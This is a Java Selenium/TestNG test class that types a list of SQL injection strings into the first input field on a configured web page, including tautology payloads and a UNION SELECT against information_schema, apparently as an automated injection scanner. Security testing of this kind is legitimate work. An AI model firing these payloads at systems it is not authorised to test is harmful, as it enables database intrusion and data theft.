package org.injector.tests;

import org.injector.utils.ScenarioContext;
import org.injector.managers.DriverManager;
import org.injector.utils.PageFactory;
import org.injector.utils.Waiter;
import org.openqa.selenium.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.testng.annotations.AfterTest;
import org.testng.annotations.BeforeTest;
import org.testng.annotations.Parameters;
import org.testng.annotations.Test;


public class SqlInjectorTestOne {
    private WebDriver driver;
    private PageFactory pageFactory;
    private Waiter waiter;
    @Autowired
    private ScenarioContext scenarioContext;

    @BeforeTest
    public void setup() {
        driver = DriverManager.getDriver();
        pageFactory = new PageFactory(driver);
        waiter = Waiter.getInstance();
    }

    @AfterTest
    public void tearDown() {
        try {
            DriverManager.quitDriver();
        } catch (Exception e) {
            System.out.println("-- Oops, browser issues ='( --");
        }
    }

    @Parameters("appUrl")
    @Test
    public void sqlInjectionTest() {
        String appUrl = ScenarioContext.getAppUrl();
        setup();
        drawWprits();
        userChooseThePageWhereHeWantsToStartSQLInjectorTests(appUrl);
        String[] injections = {
                "' OR '1'='1'; --",
                "' UNION SELECT table_name FROM information_schema.tables; --",
                "' OR 'x'='x'; --",
                "' AND 'x'='x'; --",
                "' OR 'a'='a'; --",
                "' AND 'a'='a'; --",
                "' OR '1'='1'; --",
                "' AND '1'='1'; --",
        };

        for (int i = 0; i < injections.length; i++) {
            System.out.println("Injecting: " + injections[i]);
            userTriesToTypeInASQLInjectionIntoInputField(injections[i]);
        }

        userClicksOnEnter();
    }

    private void userClicksOnEnter() {

    }

    public void userChooseThePageWhereHeWantsToStartSQLInjectorTests(String appUrl) {
        driver.get(appUrl);
    }


    private void userTriesToTypeInASQLInjectionIntoInputField(String sqlInjection) {
        WebElement inputElement;
        try {
            inputElement = driver.findElement(By.cssSelector("input"));
        } catch (NoSuchElementException e) {
            pageFactory.scrollDownToFindInput();

            inputElement = waiter.waitElementToBePresenceOnThePageByCssSelector("input");

            if (inputElement == null) {
                throw new NoSuchElementException("Input field not found after scrolling");
            }
        }
        inputElement.clear();
        inputElement.sendKeys(sqlInjection);
        inputElement.sendKeys(Keys.RETURN);
    }

    public void drawWprits() {
        System.out.println
                ("          ______\n" +
                "\t     |______|\n" +
                "\t        ||\n" +
                "\t        ||\n" +
                "         ___||___\n" +
                "        |         |\n" +
                "        |         |\n" +
                "        |   SQL   |\n" +
                "        |         |\n" +
                "        |_________|\n" +
                "          \\     /\n" +
                "           \\___/\n" +
                "\t         |\n" +
                "\t         |\n" +
                "\t         |\n" +
                "\t         |");
    }
}
